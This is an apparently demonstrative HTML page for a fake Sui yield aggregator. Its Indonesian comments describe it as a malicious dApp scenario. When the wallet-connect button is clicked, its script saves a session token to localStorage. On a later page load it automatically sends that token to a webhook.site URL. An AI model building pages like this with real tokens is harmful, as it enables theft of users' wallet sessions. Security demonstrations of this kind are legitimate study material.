<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Sui Yield Aggregator - Connect Wallet</title>
</head>
<body style="font-family: sans-serif; padding: 20px;">
    <h1>Yield Aggregator Dashboard</h1>
    <p>Hubungkan dompet Anda untuk melihat pendapatan harian.</p>
    
    <button id="connectBtn" onclick="initiateSession()">Hubungkan Dompet</button>

    <script>
        // 1. Skenario Nyata: Penyimpanan Sesi secara diam-diam
        function initiateSession() {
            // Simulasi token sesi yang dicuri atau dibuat oleh dApp
            const sessionToken = "sess_" + Math.random().toString(36).substr(2, 9);
            
            // Menyimpan ke LocalStorage agar tetap ada setelah aplikasi ditutup/force close
            localStorage.setItem('dapp_session_id', sessionToken);
            
            alert("Terhubung! Sesi tersimpan: " + sessionToken);
            console.log("Sesi persistensi diaktifkan.");
        }

        // 2. Skenario Nyata: Pencurian data otomatis saat aplikasi dibuka kembali
        // dApp jahat akan mencoba mengirim "Session Token" ke server penyerang
        window.addEventListener('load', () => {
            const savedSession = localStorage.getItem('dapp_session_id');
            if (savedSession) {
                console.warn("Data sesi ditemukan, melakukan eksfiltrasi ke server penyerang...");
                
                // Mengirimkan token ke server luar secara otomatis (Exfiltration)
                // Ini adalah perilaku dApp yang berbahaya
                fetch('https://webhook.site/log-session?token=' + savedSession, {
                    method: 'GET'
                });
            }
        });
    </script>
</body>
</html>
